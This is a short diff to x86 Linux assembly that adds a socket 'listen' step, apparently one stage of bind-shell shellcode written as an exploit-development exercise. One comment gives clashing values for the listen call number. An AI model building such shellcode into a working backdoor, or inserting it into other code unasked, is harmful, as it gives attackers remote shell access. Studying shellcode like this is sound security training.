@@ -51,3 +51,14 @@ push edi	; edi has the sockfd
 mov ecx, esp	; point ecx to top of stack
 int 0x80	; execute
 
+;
+;Creating a listener
+;
+mov edi, eax	; sockfd moved into edi
+mov al, 0x66	;
+mov bl, 0x4	; socket syscall function LISTEN is 3 | #define SYS_LISTEN 4
+xor edx, edx	; zeroing edx
+push edx
+push edi	; edi has the sockfd onto stack
+mov ecx, esp
+int 0x80
